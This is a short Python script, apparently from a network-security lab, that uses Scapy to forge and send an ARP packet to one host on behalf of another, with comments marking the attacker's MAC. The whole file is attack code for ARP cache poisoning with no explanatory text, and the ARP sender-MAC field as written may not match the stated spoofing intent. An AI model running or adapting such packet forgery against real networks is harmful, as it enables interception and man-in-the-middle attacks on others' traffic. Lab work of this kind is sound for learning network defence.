#!/usr/bin/python3
from scapy.all import *
#dst=hostA_MAC, src=attackerMAC 
E = Ether(dst = '02:42:0a:09:00:05', src = '02:42:0a:09:00:69') 
#ARP(hwsrc=hostB_MAC, psrc=hostB, hwdst=hostA_MAC, pdst=hostA) 
A = ARP(hwsrc='02:42:0a:09:00:06',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')
 
pkt = E/A
pkt.show()
sendp(pkt)
